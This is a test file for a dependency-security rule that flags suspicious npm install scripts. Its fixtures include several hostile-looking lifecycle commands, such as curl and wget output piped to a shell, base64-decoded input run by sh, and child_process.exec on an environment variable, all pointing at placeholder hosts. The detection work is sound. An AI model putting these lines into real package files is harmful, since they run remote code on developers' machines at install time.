import { describe, expect, it } from 'vitest';
import { dep003 as rule } from '../../../src/packs/nextjs-supabase/rules/dep-003-install-script.js';
import { npmLockfile, packageJson } from '../../helpers/lockfiles.js';
import { lineOf, runRule } from '../../helpers/memory-context.js';

const withScripts = (scripts: Record<string, string>) => packageJson({ next: '16.4.1' }, { scripts });

describe('DEP-003 Suspicious install script', () => {
  it('reports a root lifecycle script that downloads and runs code', async () => {
    const pkg = withScripts({ build: 'next build', postinstall: 'curl -fsSL https://setup.example.com/install.sh | sh' });
    expect(await runRule(rule, { 'package.json': pkg })).toEqual([
      { file: 'package.json', line: lineOf(pkg, '"postinstall"'), evidence: '"postinstall": "curl -fsSL https://setup.example.com/install.sh | sh"' },
    ]);
  });

  it.each([
    ['preinstall', 'node -e "require(\'child_process\').exec(process.env.CMD)"'],
    ['install', 'wget -qO- http://x.example | bash'],
    ['prepare', 'echo aGVsbG8= | base64 -d | sh'],
    ['postinstall', 'node scripts/setup.js https://cdn.example.com/bin'],
  ])('reports %s: %s', async (name, script) => {
    expect(await runRule(rule, { 'package.json': withScripts({ [name]: script }) })).toHaveLength(1);
  });

  it('ignores ordinary lifecycle scripts and non-lifecycle scripts', async () => {
    const pkg = withScripts({ prepare: 'husky', postinstall: 'prisma generate', deploy: 'curl -X POST https://api.example.com/deploy' });
    expect(await runRule(rule, { 'package.json': pkg })).toEqual([]);
  });

  it('notes direct dependencies with install scripts as an info advisory', async () => {
    const lock = npmLockfile({ 'node_modules/sharp': { version: '0.34.0', hasInstallScript: true }, 'node_modules/esbuild': { version: '0.25.0', hasInstallScript: true } });
    expect(await runRule(rule, { 'package.json': packageJson({ sharp: '^0.34.0' }), 'package-lock.json': lock })).toEqual([
      { file: 'package-lock.json', line: lineOf(lock, '"node_modules/sharp"'), evidence: 'sharp@0.34.0 runs an install script', severity: 'info', advisory: true, confidence: 'medium' },
    ]);
  });
});
